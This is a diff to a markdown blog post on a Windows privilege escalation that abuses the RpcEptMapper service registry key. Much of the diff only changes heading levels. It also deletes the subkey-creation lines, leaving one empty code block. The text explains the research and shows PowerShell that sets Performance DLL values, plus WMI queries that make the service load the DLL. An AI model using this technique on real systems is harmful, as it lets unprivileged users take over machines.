@@ -41,7 +41,7 @@ What does this mean exactly? It means that we cannot just modify the `ImagePath`
 
 Does it mean that it was indeed a false positive? Surely not. Let the fun begin!
 
-### RTFM <a id="rtfm"></a>
+## RTFM <a id="rtfm"></a>
 
 At this point, we know that we can create arbirary subkeys under `HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper` but we cannot modify existing subkeys and values. These already existing subkeys are `Parameters` and `Security`, which are quite common for Windows services.
 
@@ -87,7 +87,7 @@ DWORD APIENTRY ClosePerfData();
 
 I think that’s enough with the theory, it’s time to start writing some code!
 
-### Writing a Proof-of-Concept <a id="writing-a-proof-of-concept"></a>
+## Writing a Proof-of-Concept <a id="writing-a-proof-of-concept"></a>
 
 Thanks to all the bits and pieces I was able to collect throughout the documentation, writing a simple Proof-of-Concept DLL should be pretty straightforward. But still, we need a plan!
 
@@ -230,7 +230,7 @@ If you want to see the full code, I uploaded it [here](https://gist.github.com/i
 
 Finally, we can select _**Release/x64**_ and “_**Build the solution**_”. This will produce our DLL file: `.\DllRpcEndpointMapperPoc\x64\Release\DllRpcEndpointMapperPoc.dll`.
 
-### Testing the PoC <a id="testing-the-poc"></a>
+## Testing the PoC <a id="testing-the-poc"></a>
 
 Before going any further, I always make sure that my payload is working properly by testing it separately. The little time spent here can save a lot of time afterwards by preventing you from going down a rabbit hole during a hypothetical debug phase. To do so, we can simply use `rundll32.exe` and pass the name of the DLL and the name of an exported function as the parameters.
 
@@ -258,7 +258,7 @@ I didn’t really investigate this issue but my guess is that when we call `New-
 Anyway, if the built-in cmdlets don’t do the job, we can always go down one level and invoke DotNet functions directly. Indeed, registry keys can also be created with the following code in PowerShell.
 
 ```text
-[Microsoft.Win32.Registry]::LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance")
+
 ```
 
 ![](https://itm4n.github.io/assets/posts/2020-11-12-windows-registry-rpceptmapper-eop/11_powershell-dotnet-createsubkey.png)
@@ -269,7 +269,6 @@ Here we go! In the end, I put together the following script in order to create t
 $ServiceKey = "SYSTEM\CurrentControlSet\Services\RpcEptMapper\Performance"
 
 Write-Host "[*] Create 'Performance' subkey"
-[void] [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($ServiceKey)
 Write-Host "[*] Create 'Library' value"
 New-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Value "$($pwd)\DllRpcEndpointMapperPoc.dll" -PropertyType "String" -Force | Out-Null
 Write-Host "[*] Create 'Open' value"
@@ -286,7 +285,6 @@ Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Library" -Force
 Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Open" -Force
 Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Collect" -Force
 Remove-ItemProperty -Path "HKLM:$($ServiceKey)" -Name "Close" -Force
-[Microsoft.Win32.Registry]::LocalMachine.DeleteSubKey($ServiceKey)
 ```
 
 The last step now, **how do we trick the RPC Endpoint Mapper service into loading our Performace DLL?** Unfortunately, I haven’t kept track of all the different things I tried. It would have been really interesting in the context of this blog post to highlight how tedious and time consuming research can sometimes be. Anyway, one thing I found along the way is that you can query _Perfomance Counters_ using WMI \(_Windows Management Instrumentation_\), which isn’t too surprising after all. More info here: [_WMI Performance Counter Types_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-performance-counter-types).
@@ -331,7 +329,7 @@ Get-WmiObject Win32_PerfRawData
 Get-WmiObject Win32_PerfFormattedData
 ```
 
-### Conclusion <a id="conclusion"></a>
+## Conclusion <a id="conclusion"></a>
 
 I don’t know how this vulnerability has gone unnoticed for so long. One explanation is that other tools probably looked for full write access in the registry, whereas `AppendData/AddSubdirectory` was actually enough in this case. Regarding the “misconfiguration” itself, I would assume that the registry key was set this way for a specific purpose, although I can’t think of a concrete scenario in which users would have any kind of permissions to modify a service’s configuration.
 
